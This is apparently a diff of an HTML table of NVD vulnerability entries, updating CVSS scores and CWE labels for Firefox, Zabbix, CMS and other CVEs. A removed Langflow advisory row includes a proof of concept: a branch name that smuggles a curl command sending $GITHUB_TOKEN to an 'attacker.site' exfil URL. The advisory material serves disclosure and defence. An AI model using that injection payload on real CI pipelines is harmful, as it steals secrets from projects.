+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23923" target="_blank" rel="noopener">CVE-2026-23923</a></td>
+        <td>6.9</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-470</td>
+        <td>&nbsp;</td>
+        <td><details><summary>An unauthenticated attacker can exploit the Frontend &#x27;validate&#x27; action to blindl...</summary><p>An unauthenticated attacker can exploit the Frontend &#x27;validate&#x27; action to blindly instantiate arbitrary PHP classes. The impact depends on environment setup but appears limited at this time.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23921" target="_blank" rel="noopener">CVE-2026-23921</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
+        <td>&nbsp;</td>
+        <td><details><summary>A low privilege Zabbix user with API access can exploit a blind SQL injection vu...</summary><p>A low privilege Zabbix user with API access can exploit a blind SQL injection vulnerability in include/classes/api/CApiService.php to execute arbitrary SQL selects via the sortfield parameter. Although query results are not returned directly, an attacker can exfiltrate arbitrary database data through time-based techniques, potentially leading to session identifier disclosure and administrator account compromise.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23920" target="_blank" rel="noopener">CVE-2026-23920</a></td>
+        <td>7.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-78</td>
+        <td>&nbsp;</td>
+        <td><details><summary>Host and event action script input is validated with a regex (set by the adminis...</summary><p>Host and event action script input is validated with a regex (set by the administrator), but the validation runs in multiline mode. If ^ and $ anchors are used in user input validation, an injected newline lets authenticated users bypass the check and inject shell commands.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23919" target="_blank" rel="noopener">CVE-2026-23919</a></td>
+        <td>7.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-488</td>
+        <td>&nbsp;</td>
+        <td><details><summary>For performance reasons Zabbix Server/Proxy reuses JavaScript (Duktape) contexts...</summary><p>For performance reasons Zabbix Server/Proxy reuses JavaScript (Duktape) contexts (used in script items, JavaScript reprocessing, Webhooks). This can lead to confidentiality loss where a regular (non-super) Zabbix administrator leaks data for hosts they do not have access to. A fix has been released that makes the built in Zabbix JavaScript objects read-only, but please be advised that usage of global JavaScript variables is not recommended because their content could be leaked. More information &lt;a href=&#x27;https://www.zabbix.com/documentation/7.4/en/manual/installation/known_issues#preprocessing-global-variables-are-unsafe&#x27;&gt;in Zabbix documentation&lt;/a&gt;.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1995" target="_blank" rel="noopener">CVE-2026-1995</a></td>
+        <td>0.0</td>
+        <td><span class="severity none">NONE</span></td>
+        <td>N/A</td>
+        <td>&nbsp;</td>
+        <td><details><summary>IDrive’s id_service.exe process runs with elevated privileges and regularly read...</summary><p>IDrive’s id_service.exe process runs with elevated privileges and regularly reads from several files under the C:\ProgramData\IDrive\ directory. The UTF16-LE encoded contents of these files are used as arguments for starting a process, but they can be edited by any standard user logged into the system. An attacker can overwrite or edit the files to specify a path to an arbitrary executable, which will then be executed by the id_service.exe process with SYSTEM privileges.</p></details></td>
+        <td>2026-03-24</td>
+      </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33407" target="_blank" rel="noopener">CVE-2026-33407</a></td>
         <td>8.3</td>
@@ -157,16 +543,6 @@
         <td>2026-03-24</td>
       </tr>
       <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-11571" target="_blank" rel="noopener">CVE-2025-11571</a></td>
-        <td>2.1</td>
-        <td><span class="severity low">LOW</span></td>
-        <td>CWE-78</td>
-        <td>&nbsp;</td>
-        <td><details><summary>Vulnerable endpoints accept user-controlled input through a URL in JSON format w...</summary><p>Vulnerable endpoints accept user-controlled input through a URL in JSON format which enables command execution. The commands allowed to execute can open executables. However, the commands cannot pass parameters or arguments. 
-To successfully execute this attack, the attacker needs to be on the same network.</p></details></td>
-        <td>2026-03-24</td>
-      </tr>
-      <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33700" target="_blank" rel="noopener">CVE-2026-33700</a></td>
         <td>6.9</td>
         <td><span class="severity medium">MEDIUM</span></td>
@@ -276,9 +652,9 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29840" target="_blank" rel="noopener">CVE-2026-29840</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>5.4</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-79</td>
         <td>&nbsp;</td>
         <td><details><summary>JiZhiCMS v2.5.6 and before contains a Stored Cross-Site Scripting (XSS) vulnerab...</summary><p>JiZhiCMS v2.5.6 and before contains a Stored Cross-Site Scripting (XSS) vulnerability in the release function within app/home/c/UserController.php. The application attempts to sanitize input by filtering &lt;script&gt; tags but fails to recursively remove dangerous event handlers in other HTML tags (such as onerror in &lt;img&gt; tags). This allows an authenticated remote attacker to inject arbitrary web script or HTML via the body parameter in a POST request to /user/release.html.</p></details></td>
         <td>2026-03-24</td>
@@ -312,9 +688,9 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33554" target="_blank" rel="noopener">CVE-2026-33554</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-121</td>
         <td>&nbsp;</td>
         <td><details><summary>ipmi-oem in FreeIPMI before 1.16.17 has exploitable buffer overflows on response...</summary><p>ipmi-oem in FreeIPMI before 1.16.17 has exploitable buffer overflows on response messages. The Intelligent Platform Management Interface (IPMI) specification defines a set of interfaces for platform management. It is implemented by a large number of hardware manufacturers to support system management. It is most commonly used for sensor reading (e.g., CPU temperatures through the ipmi-sensors command within FreeIPMI) and remote power control (the ipmipower command). The ipmi-oem client command implements a set of a IPMI OEM commands for specific hardware vendors. If a user has supported hardware, they may wish to use the ipmi-oem command to send a request to a server to retrieve specific information. Three subcommands were found to have exploitable buffer overflows on response messages. They are: &quot;ipmi-oem dell get-last-post-code - get the last POST code and string describing the error on some Dell servers,&quot; &quot;ipmi-oem supermicro extra-firmware-info - get extra firmware info on Supermicro servers,&quot; and &quot;ipmi-oem wistron read-proprietary-string - read a proprietary string on Wistron servers.&quot;</p></details></td>
         <td>2026-03-24</td>
@@ -348,27 +724,27 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30662" target="_blank" rel="noopener">CVE-2026-30662</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>6.5</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-400</td>
         <td>&nbsp;</td>
         <td><details><summary>ConcreteCMS v9.4.7 contains a Denial of Service (DoS) vulnerability in the File ...</summary><p>ConcreteCMS v9.4.7 contains a Denial of Service (DoS) vulnerability in the File Manager component. The &#x27;download&#x27; method in &#x27;concrete/controllers/backend/file.php&#x27; improperly manages memory when creating zip archives. It uses &#x27;ZipArchive::addFromString&#x27; combined with &#x27;file_get_contents&#x27;, which loads the entire content of every selected file into PHP memory. An authenticated attacker can exploit this by requesting a bulk download of large files, triggering an Out-Of-Memory (OOM) condition that causes the PHP-FPM process to terminate (SIGSEGV) and the web server to return a 500 error.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30661" target="_blank" rel="noopener">CVE-2026-30661</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>6.1</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-79</td>
         <td>&nbsp;</td>
         <td><details><summary>iCMS v8.0.0 contains a Cross-Site Scripting (XSS) vulnerability in the User Mana...</summary><p>iCMS v8.0.0 contains a Cross-Site Scripting (XSS) vulnerability in the User Management component, specifically within the index.html file. This allows remote attackers to execute arbitrary web script or HTML via the regip or loginip parameters.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30655" target="_blank" rel="noopener">CVE-2026-30655</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>6.5</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-89</td>
         <td>&nbsp;</td>
         <td><details><summary>SQL injection in Solicitante::resetaSenha() in esiclivre/esiclivre v0.2.2 and ea...</summary><p>SQL injection in Solicitante::resetaSenha() in esiclivre/esiclivre v0.2.2 and earlier allows unauthenticated remote attackers to gain unauthorized access to sensitive information via the cpfcnpj parameter in /reset/index.php</p></details></td>
         <td>2026-03-24</td>
@@ -546,9 +922,9 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4719" target="_blank" rel="noopener">CVE-2026-4719</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics: Text component. This vulnerabilit...</summary><p>Incorrect boundary conditions in the Graphics: Text component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
@@ -573,45 +949,45 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4716" target="_blank" rel="noopener">CVE-2026-4716</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.1</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-908</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions, uninitialized memory in the JavaScript Engine com...</summary><p>Incorrect boundary conditions, uninitialized memory in the JavaScript Engine component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4715" target="_blank" rel="noopener">CVE-2026-4715</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.1</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-908</td>
         <td>&nbsp;</td>
         <td><details><summary>Uninitialized memory in the Graphics: Canvas2D component. This vulnerability aff...</summary><p>Uninitialized memory in the Graphics: Canvas2D component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4714" target="_blank" rel="noopener">CVE-2026-4714</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Audio/Video component. This vulnerability a...</summary><p>Incorrect boundary conditions in the Audio/Video component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4713" target="_blank" rel="noopener">CVE-2026-4713</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics component. This vulnerability affe...</summary><p>Incorrect boundary conditions in the Graphics component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4712" target="_blank" rel="noopener">CVE-2026-4712</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>NVD-CWE-noinfo</td>
         <td>&nbsp;</td>
         <td><details><summary>Information disclosure in the Widget: Cocoa component. This vulnerability affect...</summary><p>Information disclosure in the Widget: Cocoa component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
@@ -636,126 +1012,126 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4709" target="_blank" rel="noopener">CVE-2026-4709</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Audio/Video: GMP component. This vulnerabil...</summary><p>Incorrect boundary conditions in the Audio/Video: GMP component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4708" target="_blank" rel="noopener">CVE-2026-4708</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics component. This vulnerability affe...</summary><p>Incorrect boundary conditions in the Graphics component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4707" target="_blank" rel="noopener">CVE-2026-4707</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerab...</summary><p>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4706" target="_blank" rel="noopener">CVE-2026-4706</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerab...</summary><p>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4705" target="_blank" rel="noopener">CVE-2026-4705</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>NVD-CWE-noinfo</td>
         <td>&nbsp;</td>
         <td><details><summary>Undefined behavior in the WebRTC: Signaling component. This vulnerability affect...</summary><p>Undefined behavior in the WebRTC: Signaling component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4704" target="_blank" rel="noopener">CVE-2026-4704</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>NVD-CWE-noinfo</td>
         <td>&nbsp;</td>
         <td><details><summary>Denial-of-service in the WebRTC: Signaling component. This vulnerability affects...</summary><p>Denial-of-service in the WebRTC: Signaling component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4702" target="_blank" rel="noopener">CVE-2026-4702</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-843</td>
         <td>&nbsp;</td>
         <td><details><summary>JIT miscompilation in the JavaScript Engine component. This vulnerability affect...</summary><p>JIT miscompilation in the JavaScript Engine component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4701" target="_blank" rel="noopener">CVE-2026-4701</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-416</td>
         <td>&nbsp;</td>
         <td><details><summary>Use-after-free in the JavaScript Engine component. This vulnerability affects Fi...</summary><p>Use-after-free in the JavaScript Engine component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4700" target="_blank" rel="noopener">CVE-2026-4700</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>NVD-CWE-noinfo</td>
         <td>&nbsp;</td>
         <td><details><summary>Mitigation bypass in the Networking: HTTP component. This vulnerability affects ...</summary><p>Mitigation bypass in the Networking: HTTP component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4699" target="_blank" rel="noopener">CVE-2026-4699</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Layout: Text and Fonts component. This vuln...</summary><p>Incorrect boundary conditions in the Layout: Text and Fonts component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4698" target="_blank" rel="noopener">CVE-2026-4698</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-843</td>
         <td>&nbsp;</td>
         <td><details><summary>JIT miscompilation in the JavaScript Engine: JIT component. This vulnerability a...</summary><p>JIT miscompilation in the JavaScript Engine: JIT component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4697" target="_blank" rel="noopener">CVE-2026-4697</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Audio/Video: Web Codecs component. This vul...</summary><p>Incorrect boundary conditions in the Audio/Video: Web Codecs component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4696" target="_blank" rel="noopener">CVE-2026-4696</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-416</td>
         <td>&nbsp;</td>
         <td><details><summary>Use-after-free in the Layout: Text and Fonts component. This vulnerability affec...</summary><p>Use-after-free in the Layout: Text and Fonts component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4695" target="_blank" rel="noopener">CVE-2026-4695</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Audio/Video: Web Codecs component. This vul...</summary><p>Incorrect boundary conditions in the Audio/Video: Web Codecs component. This vulnerability affects Firefox &lt; 149 and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
@@ -771,9 +1147,9 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4693" target="_blank" rel="noopener">CVE-2026-4693</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Audio/Video: Playback component. This vulne...</summary><p>Incorrect boundary conditions in the Audio/Video: Playback component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
@@ -789,18 +1165,18 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4691" target="_blank" rel="noopener">CVE-2026-4691</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>9.8</td>
+        <td><span class="severity critical">CRITICAL</span></td>
+        <td>CWE-416</td>
         <td>&nbsp;</td>
         <td><details><summary>Use-after-free in the CSS Parsing and Computation component. This vulnerability ...</summary><p>Use-after-free in the CSS Parsing and Computation component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4690" target="_blank" rel="noopener">CVE-2026-4690</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>8.6</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-190</td>
         <td>&nbsp;</td>
         <td><details><summary>Sandbox escape due to incorrect boundary conditions, integer overflow in the XPC...</summary><p>Sandbox escape due to incorrect boundary conditions, integer overflow in the XPCOM component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
@@ -825,27 +1201,27 @@ To successfully execute this attack, the attacker needs to be on the same networ
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4687" target="_blank" rel="noopener">CVE-2026-4687</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>8.6</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Sandbox escape due to incorrect boundary conditions in the Telemetry component. ...</summary><p>Sandbox escape due to incorrect boundary conditions in the Telemetry component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4686" target="_blank" rel="noopener">CVE-2026-4686</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerab...</summary><p>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4685" target="_blank" rel="noopener">CVE-2026-4685</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-754</td>
         <td>&nbsp;</td>
         <td><details><summary>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerab...</summary><p>Incorrect boundary conditions in the Graphics: Canvas2D component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
         <td>2026-03-24</td>
@@ -857,91 +1233,6 @@ To successfully execute this attack, the attacker needs to be on the same networ
         <td>CWE-362</td>
         <td>&nbsp;</td>
         <td><details><summary>Race condition, use-after-free in the Graphics: WebRender component. This vulner...</summary><p>Race condition, use-after-free in the Graphics: WebRender component. This vulnerability affects Firefox &lt; 149, Firefox ESR &lt; 115.34, and Firefox ESR &lt; 140.9.</p></details></td>
-        <td>2026-03-24</td>
-      </tr>
-      <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33475" target="_blank" rel="noopener">CVE-2026-33475</a></td>
-        <td>9.1</td>
-        <td><span class="severity critical">CRITICAL</span></td>
-        <td>CWE-74</td>
-        <td>&nbsp;</td>
-        <td><details><summary>Langflow is a tool for building and deploying AI-powered agents and workflows. A...</summary><p>Langflow is a tool for building and deploying AI-powered agents and workflows. An unauthenticated remote shell injection vulnerability exists in multiple GitHub Actions workflows in the Langflow repository prior to version 1.9.0. Unsanitized interpolation of GitHub context variables (e.g., `${{ github.head_ref }}`) in `run:` steps allows attackers to inject and execute arbitrary shell commands via a malicious branch name or pull request title. This can lead to secret exfiltration (e.g., `GITHUB_TOKEN`), infrastructure manipulation, or supply chain compromise during CI/CD execution. Version 1.9.0 patches the vulnerability.
-
----
-
-### Details
-
-Several workflows in `.github/workflows/` and `.github/actions/` reference GitHub context variables directly in `run:` shell commands, such as:
-
-```yaml
-run: |
-  validate_branch_name &quot;${{ github.event.pull_request.head.ref }}&quot;
-```
-
-Or:
-
-```yaml
-run: npx playwright install ${{ inputs.browsers }} --with-deps
-```
-
-Since `github.head_ref`, `github.event.pull_request.title`, and custom `inputs.*` may contain **user-controlled values**, they must be treated as **untrusted input**. Direct interpolation without proper quoting or sanitization leads to shell command injection.
-
----
-
-### PoC
-
-1. **Fork** the Langflow repository
-2. **Create a new branch** with the name:
-   ```bash
-   injection-test &amp;&amp; curl https://attacker.site/exfil?token=$GITHUB_TOKEN
-   ```
-3. **Open a Pull Request** to the main branch from the new branch
-4. GitHub Actions will run the affected workflow (e.g., `deploy-docs-draft.yml`)
-5. The `run:` step containing:
-   ```yaml
-   echo &quot;Branch: ${{ github.head_ref }}&quot;
-   ```
-   Will execute:
-   ```bash
-   echo &quot;Branch: injection-test&quot;
-   curl https://attacker.site/exfil?token=$GITHUB_TOKEN
-   ```
-
-6. The attacker receives the CI secret via the exfil URL.
-
----
-
-### Impact
-
-- **Type:** Shell Injection / Remote Code Execution in CI
-- **Scope:** Any public Langflow fork with GitHub Actions enabled
-- **Impact:** Full access to CI secrets (e.g., `GITHUB_TOKEN`), possibility to push malicious tags or images, tamper with releases, or leak sensitive infrastructure data
-
----
-
-### Suggested Fix
-
-Refactor affected workflows to **use environment variables** and wrap them in **double quotes**:
-
-```yaml
-env:
-  BRANCH_NAME: ${{ github.head_ref }}
-run: |
-  echo &quot;Branch is: \&quot;$BRANCH_NAME\&quot;&quot;
-```
-
-Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled value.
-
----
-
-### Affected Files (Langflow `1.3.4`)
-
-- `.github/actions/install-playwright/action.yml`
-- `.github/workflows/deploy-docs-draft.yml`
-- `.github/workflows/docker-build.yml`
-- `.github/workflows/release_nightly.yml`
-- `.github/workflows/python_test.yml`
-- `.github/workflows/typescript_test.yml`</p></details></td>
         <td>2026-03-24</td>
       </tr>
       <tr>
@@ -6684,6 +6975,19 @@ Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled va
